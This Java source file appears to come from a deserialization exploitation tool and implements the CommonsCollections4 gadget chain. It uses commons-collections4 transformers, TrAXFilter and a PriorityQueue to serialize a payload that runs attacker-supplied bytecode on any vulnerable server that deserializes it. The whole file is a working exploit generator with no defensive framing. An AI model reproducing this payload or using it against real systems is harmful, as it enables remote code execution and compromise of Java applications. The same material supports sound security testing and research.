package cn.safe6.payload;

import cn.safe6.util.Gadgets;
import cn.safe6.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

public class CommonsCollections4 {



    public static byte[] getPayload(byte[] bytes) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(bytes);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[]{String.class};
        Object[] args = new Object[]{"foo"};
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}
